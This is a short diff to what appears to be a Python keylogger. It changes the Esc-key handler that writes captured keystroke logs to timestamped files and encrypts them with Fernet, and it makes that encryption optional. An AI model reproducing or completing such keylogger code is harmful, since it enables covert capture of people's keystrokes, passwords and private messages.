@@ -155,25 +155,24 @@ def write_file(key, time):
 def on_release(key):
     if key == Key.esc:
         if optionB:
-            print(bLog)
             with open(path + "/log_b_{}.txt".format(timestamp), "a") as fb:
                 fb.write("{}".format(bLog))
         # Encrypt files
-        if optionA:
+        if optionA and encrypt:
             with open(path + "/log_a_{}.txt".format(timestamp), "rb") as f:
                 data = f.read()
             fernet = Fernet(eKey)
             encrypted = fernet.encrypt(data)
             with open(path + "/log_a_{}.txt".format(timestamp), "wb") as f:
                 f.write(encrypted)
-        if optionB:
+        if optionB and encrypt:
             with open(path + "/log_b_{}.txt".format(timestamp), "rb") as f:
                 data = f.read()
             fernet = Fernet(eKey)
             encrypted = fernet.encrypt(data)
             with open(path + "/log_b_{}.txt".format(timestamp), "wb") as f:
                 f.write(encrypted)
-        if optionC:
+        if optionC and encrypt:
             with open(path + "/log_c_{}.txt".format(timestamp), "rb") as f:
                 data = f.read()
             fernet = Fernet(eKey)
